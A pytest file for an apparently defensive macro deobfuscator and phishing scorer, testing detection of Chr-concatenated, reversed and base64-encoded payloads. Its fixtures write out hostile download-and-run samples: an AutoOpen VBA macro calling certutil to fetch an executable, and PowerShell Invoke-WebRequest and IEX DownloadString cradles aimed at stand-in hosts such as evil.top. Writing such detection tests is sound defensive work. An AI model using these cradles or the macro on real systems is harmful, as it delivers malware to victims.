import pytest
import sys
import os

# Add Backend to python path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from services.document_parsers.deobfuscator import (
    deobfuscate_chr_concatenations,
    deobfuscate_str_reverse,
    deobfuscate_split_strings,
    deobfuscate_base64_payloads,
    deobfuscate_hex_payloads,
    extract_hidden_iocs,
    run_deobfuscation_pipeline,
)
from services.document_parsers.scorer import calculate_score, WEIGHTS


def test_chr_concatenation_pure():
    code = 'url = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & Chr(101) & Chr(118) & Chr(105) & Chr(108) & Chr(46) & Chr(99) & Chr(111) & Chr(109)'
    transformed, findings = deobfuscate_chr_concatenations(code)
    assert len(findings) > 0
    assert findings[0]["unmasked"] == "http://evil.com"
    assert '"http://evil.com"' in transformed


def test_chr_concatenation_mixed():
    code = 'endpoint = "https://" & Chr(97) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(107) & ".xyz/payload.exe"'
    transformed, findings = deobfuscate_chr_concatenations(code)
    assert len(findings) > 0
    assert findings[0]["unmasked"] == "https://attack.xyz/payload.exe"


def test_str_reverse_evaluation():
    code = 'download_url = StrReverse("exe.rotavitca/moc.kcatta//:ptth")'
    transformed, findings = deobfuscate_str_reverse(code)
    assert len(findings) > 0
    assert findings[0]["unmasked"] == "http://attack.com/activator.exe"
    assert '"http://attack.com/activator.exe"' in transformed


def test_split_string_join():
    code = 'cmd = "p" & "o" & "w" & "e" & "r" & "s" & "h" & "e" & "l" & "l"'
    transformed, findings = deobfuscate_split_strings(code)
    assert len(findings) > 0
    assert findings[0]["unmasked"] == "powershell"


def test_base64_powershell_utf16le():
    # "powershell.exe -w hidden -enc IEX" encoded in UTF-16LE
    # b"p\x00o\x00w\x00e\x00r\x00s\x00h\x00e\x00l\x00l\x00.\x00e\x00x\x00e\x00"
    import base64
    ps_cmd = "powershell -Command Invoke-WebRequest http://185.220.101.5/malware.exe -OutFile C:\\temp\\update.exe"
    b64_str = base64.b64encode(ps_cmd.encode("utf-16le")).decode("ascii")
    
    code = f'Dim payload As String\npayload = "{b64_str}"'
    _, findings = deobfuscate_base64_payloads(code)
    assert len(findings) > 0
    assert findings[0]["is_threat_payload"] is True
    assert "invoke-webrequest" in findings[0]["unmasked"].lower()


def test_ioc_extraction():
    sample_text = (
        'http://malicious-c2-server.top/dropper.exe is contacting 195.123.45.67 '
        'to execute powershell -ExecutionPolicy Bypass -File payload.ps1'
    )
    iocs = extract_hidden_iocs(sample_text)
    assert "http://malicious-c2-server.top/dropper.exe" in iocs["urls"]
    assert "195.123.45.67" in iocs["ips"]
    assert any("dropper.exe" in f for f in iocs["dropped_files"])
    assert any("payload.ps1" in f for f in iocs["dropped_files"])
    assert "powershell" in iocs["commands"]


def test_full_pipeline_orchestration():
    macro_code = '''
    Sub AutoOpen()
        Dim dUrl As String
        Dim sCmd As String
        dUrl = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & Chr(56) & Chr(46) & Chr(56) & Chr(46) & Chr(56) & Chr(46) & Chr(56) & Chr(47) & Chr(105) & Chr(110) & Chr(118) & Chr(111) & Chr(105) & Chr(99) & Chr(101) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
        sCmd = StrReverse("exe.dmc")
        Shell(sCmd & " /c certutil -urlcache -split -f " & dUrl)
    End Sub
    '''
    result = run_deobfuscation_pipeline(macro_code)
    assert result["deobfuscation_applied"] is True
    assert len(result["transformations"]) >= 2
    assert "chr_obfuscation_detected" in result["new_findings"]
    assert "reverse_string_obfuscation" in result["new_findings"]
    assert "deobfuscated_malicious_url" in result["new_findings"]
    assert "deobfuscated_executable_drop" in result["new_findings"]
    assert "http://8.8.8.8/invoice.exe" in result["iocs"]["urls"]
    assert "cmd.exe" in result["iocs"]["dropped_files"]

    # Verify score calculation with these findings
    score_res = calculate_score(result["new_findings"])
    assert score_res["score"] >= 70
    assert score_res["verdict"] == "Phishing"
    assert len(score_res["mitre_techniques"]) > 0


def test_string_replace_deobfuscation():
    code = 'target = Replace("c!m!d!.!e!x!e", "!", "")'
    res = run_deobfuscation_pipeline(code)
    assert res["deobfuscation_applied"] is True
    assert "cmd.exe" in res["unmasked_code_sample"]


def test_powershell_encoded_command_detection():
    # "IEX (New-Object Net.WebClient).DownloadString('http://evil.top/p')" in UTF-16LE
    import base64
    ps_cmd = "IEX (New-Object Net.WebClient).DownloadString('http://evil.top/p')"
    b64_str = base64.b64encode(ps_cmd.encode("utf-16le")).decode("ascii")
    code = f'powershell.exe -ExecutionPolicy Bypass -enc {b64_str}'

    res = run_deobfuscation_pipeline(code)
    assert res["deobfuscation_applied"] is True
    assert "powershell_encoded_command" in res["new_findings"]
    assert "http://evil.top/p" in res["iocs"]["urls"]

